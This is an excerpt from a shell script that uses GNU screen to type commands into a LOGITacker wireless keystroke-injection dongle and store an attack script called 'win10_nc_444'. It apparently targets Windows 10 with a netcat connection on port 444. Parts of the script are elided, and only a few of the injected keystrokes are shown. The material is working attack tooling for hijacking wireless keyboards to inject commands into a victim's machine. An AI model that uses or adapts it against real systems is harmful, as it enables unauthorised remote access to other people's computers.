...
echo "Can't save payload because dongle is not present on /dev/ttyACM0"
exit 1
fi
...
# run this script to attach to /dev/ttyACM0 via screen in Linux and save the payload
...
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string 445"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SEMICOLON"`echo -ne '\015'`
...
python3 -c "import time; time.sleep(0.05)"
#screen -x LOGITacker_screen -p 0 -X stuff "script store 'win10_nc_444'"`echo -ne '\015'`
get_pid_of_LOGITacker_screen=$(screen -list | grep 'LOGITacker_screen' | awk -F'.' '{print $1}' | awk '{$1=$1;print}')
kill $get_pid_of_LOGITacker_screen
echo "Script win10_nc_444 saved."
echo "Log on to the dongle with \"screen /dev/ttyACM0\" and verify the script with these commands:"
echo "script list"
echo "script load win10_nc_444"
echo "script show"
fi
